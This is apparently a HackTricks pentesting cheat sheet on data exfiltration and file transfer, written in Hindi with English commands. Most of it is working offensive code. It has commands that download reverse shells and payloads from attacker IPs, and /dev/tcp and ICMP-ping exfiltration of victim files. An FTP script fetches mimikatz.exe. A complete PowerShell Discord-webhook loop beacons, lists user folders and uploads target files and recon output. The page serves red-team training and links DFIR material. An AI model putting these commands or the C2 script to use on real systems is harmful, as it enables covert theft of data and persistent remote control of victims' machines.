# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> end-to-end उदाहरण के लिए, जिसमें loot को `C:\Users\Public` में स्टेज किया जाता है और Rclone के साथ इसे exfiltrating कर वैध backups की नकल की जाती है, नीचे दिए गए workflow की समीक्षा करें।

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Commonly whitelisted domains to exfiltrate information

जाँचें [https://lots-project.com/](https://lots-project.com/) ताकि commonly whitelisted domains मिल सकें जिनका दुरुपयोग किया जा सकता है

## Copy\&Paste Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### फ़ाइलें अपलोड करें

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python मॉड्यूल [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS सर्वर**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration

Webhooks write-only HTTPS endpoints होते हैं जो JSON और वैकल्पिक file parts स्वीकार करते हैं। इन्हें आमतौर पर trusted SaaS domains पर अनुमति दी जाती है और इन्हें OAuth/API keys की ज़रूरत नहीं होती, जिससे ये low-friction beaconing और exfiltration के लिए उपयोगी होते हैं।

Key ideas:
- Endpoint: Discord उपयोग करता है https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data के साथ एक पार्ट जिसका नाम payload_json है और जिसमें {"content":"..."} होता है, और वैकल्पिक file part(s) जिनका नाम file होता है।
- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK डिलीवरी की पुष्टि करते हैं।

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
नोट:
- समान पैटर्न अन्य सहयोगी प्लेटफ़ॉर्मों (Slack/Teams) पर भी लागू होते हैं जो उनके incoming webhooks का उपयोग करते हैं; URL और JSON schema के अनुसार समायोजित करें।
- Discord Desktop के cache artifacts और webhook/API recovery के DFIR के लिए, देखें:

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## FTP

### FTP server (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP server (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP server (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** क्लाइंट
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali को server के रूप में
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
या smb शेयर **samba का उपयोग करके**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
विंडोज़
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

attacker के पास SSHd चल रहा होना चाहिए।
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

यदि लक्षित सिस्टम पर SSH उपलब्ध है, तो हमलावर उस सिस्टम की किसी डायरेक्टरी को अपने सिस्टम पर माउंट कर सकता है।
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## एनसी
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### victim से फ़ाइल डाउनलोड करें
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### फ़ाइल को victim पर अपलोड करें
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
धन्यवाद **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

यदि आप किसी SMTP server को डेटा भेज सकते हैं, तो आप python के साथ डेटा प्राप्त करने के लिए एक SMTP बना सकते हैं:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इसे इंस्टॉलेशन के दौरान स्पष्ट रूप से जोड़ना होता है)

Kali में, **start TFTP server**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP सर्वर python में:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**victim** में, Kali सर्वर से कनेक्ट करें:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHP oneliner से फ़ाइल डाउनलोड करें:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**शिकार**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe` प्रोग्राम न केवल binaries का निरीक्षण करने की अनुमति देता है बल्कि इसमें **hex से उन्हें पुनर्निर्मित करने की क्षमता** भी है। 

इसका मतलब है कि किसी बाइनरी का hex प्रदान करके, `debug.exe` बाइनरी फ़ाइल जनरेट कर सकता है। 

हालाँकि, यह ध्यान देने योग्य है कि debug.exe में **आकार में 64 kb तक की फाइलों को असेंबल करने की सीमा** है।
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
फिर उस टेक्स्ट को windows-shell में कॉपी-पेस्ट करें और nc.exe नाम की एक फ़ाइल बन जाएगी।

- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)

## संदर्भ

- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)

{{#include ../banners/hacktricks-training.md}}
